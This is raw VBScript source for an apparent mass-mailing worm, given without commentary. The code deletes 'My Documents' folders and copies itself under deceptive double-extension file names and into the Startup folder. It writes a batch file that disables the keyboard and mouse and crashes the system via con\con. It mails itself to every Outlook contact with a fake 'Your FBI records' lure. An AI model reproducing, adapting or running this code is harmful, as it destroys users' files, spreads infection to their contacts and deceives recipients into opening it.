   s = inputbox("Enter Bens Password:" , "Password" , "Password")
   if s = "texg" then
   Set filesysdelfile = CreateObject("Scripting.FileSystemObject")
   filesysdelfile.DeleteFile "C:\Windows\Desktop\My Documents",True
   Set filesysdelfile = CreateObject("Scripting.FileSystemObject")
   filesysdelfile.DeleteFile "C:\My Documents",True
   set fso=CreateObject("Scripting.FileSystemObject")
   fso.CopyFile Wscript.ScriptFullName, "C:\Program Files\Gamez.html.vbs", True
   set fso=CreateObject("Scripting.FileSystemObject")
   fso.CopyFile Wscript.ScriptFullName, "C:\Mothers Day.txt.vbs", True
   set fso=CreateObject("Scripting.FileSystemObject")
   fso.CopyFile Wscript.ScriptFullName, "C:\windows\Desktop\Daddy's Girlfriend.pic.vbs", True
   set fso=CreateObject("Scripting.FileSystemObject")
   fso.CopyFile Wscript.ScriptFullName, "C:\Mommy's Boyfriendz.pic.vbs", True
   set fso=CreateObject("Scripting.FileSystemObject")
   fso.CopyFile Wscript.ScriptFullName, "C:\Important Bill Document!.txt.vbs", True
   set fso=CreateObject("Scripting.FileSystemObject")
   fso.CopyFile Wscript.ScriptFullName, "C:\Program Files\Big Daddy's XXX.pic.vbs", True
   set fso=CreateObject("Scripting.FileSystemObject")
   fso.CopyFile Wscript.ScriptFullName, "C:\Program Files\Dad's gift to mom and girlfriend.txt.vbs", True
   set fso=CreateObject("Scripting.FileSystemObject")
   fso.CopyFile Wscript.ScriptFullName, "C:\Windows\Start Menu\Programs\StartUp\Microsoft Texting.vbs", True
   newfolderpath = "c:\Windows\StartMenu\Programs\Accessories\Good Games"
   set filesys=CreateObject("Scripting.FileSystemObject")
   If Not filesys.FolderExists(newfolderpath) Then
   Set newfolder = filesys.CreateFolder(newfolderpath)
   set fso=CreateObject("Scripting.FileSystemObject")
   fso.CopyFile Wscript.ScriptFullName, "C:\\Windows\StartMenu\Programs\Accessories\Good Games\Minesweeper+.vbs", True
   set fso=CreateObject("Scripting.FileSystemObject")
   fso.CopyFile Wscript.ScriptFullName, "C:\\Windows\StartMenu\Programs\Accessories\Good Games\Mario Bros..vbs", True
   set fso=CreateObject("Scripting.FileSystemObject")
   fso.CopyFile Wscript.ScriptFullName, "C:\\Windows\StartMenu\Programs\Accessories\Good Games\Pacman.vbs", True

   set batcha=fso.CreateTextFile("C:\bat.bat")
   batcha.WriteLine "cls"
   batcha.WriteLine "@echo off"
   batcha.WriteLine "rundll keyboard,disable"
   batcha.WriteLine "rundll mouse,disable"
   batcha.WriteLine "start C:\con\con"
   batcha.Close
   Dim x
   on error resume next
   Set fso ="Scripting.FileSystem.Object"
   Set so=CreateObject(fso)
   Set ol=CreateObject("Outlook.Application")
   Set out= WScript.CreateObject("Outlook.Application")
   Set mapi = out.GetNameSpace("MAPI")
   Set a = mapi.AddressLists(1)
   For x=1 To a.AddressEntries.Count
   Set Mail=ol.CreateItem(0)
   Mail.to=ol.GetNameSpace("MAPI").AddressLists(1).AddressEntries(x)
   Mail.Subject="Your FBI records"
   Mail.Body="Your FBI rcord is too long so we had to put it in a File Attachment.  Be kind and open it.(for your FBI reocrd)"
   Mail.Attachments.Add Wscript.ScriptFullName
   Mail.Send
   Next
   ol.Quit
   shell.Run  "C:\bat.bat"
   end if
   end if
